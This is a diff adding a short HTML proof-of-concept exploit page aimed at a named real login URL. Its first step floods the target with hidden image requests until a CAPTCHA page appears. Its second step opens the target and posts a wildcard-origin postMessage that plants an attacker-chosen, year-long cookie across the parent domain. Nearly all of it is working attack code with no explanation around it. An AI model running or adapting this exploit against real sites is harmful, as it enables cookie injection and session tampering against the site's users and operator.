@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
+    <title>Document</title>
+</head>
+
+<body>
+    <style>
+        input {
+            width: 300px;
+            height: 20px;
+        }
+
+        img {
+            display: none;
+        }
+    </style>
+    step 1: force the target show CAPTCHA page:
+    <input type="text" id="target" placeholder="target url" value="https://app.datadome.co/dashboard/login">
+    <input type="text" id="count" placeholder="how many requests to send, eg: 10" value="20">
+    <button onclick="sendBunchRequest()">send bunch requests</button>
+    <br>
+    step 2:
+    <button onclick="exp()">EXP</button>
+    <script>
+        function sendBunchRequest() {
+            let target = document.getElementById('target').value;
+            let count = parseInt(document.getElementById('count').value);
+            while (count > 0) {
+                let img = document.createElement('img');
+                img.src = target + "?v=" + Math.random();
+                document.body.append(img);
+                count--
+            }
+        }
+        function getTld(url) {
+            let urlObj = new URL(url);
+            let tmp = urlObj.host.split('.');
+            tmp.shift();
+            return tmp.join('.');
+        }
+        function exp() {
+            let target = document.getElementById('target').value;
+            let tld = getTld(target);
+            let message = '{"cookie":"evil_name=evil_value;domain=' + tld + ';path=/; max-age=31536000"}';
+            foo = window.open(target);
+            setTimeout(function () {
+                foo.postMessage(message, "*");
+            }, 1000)
+        }
+    </script>
+</body>
+
+</html>
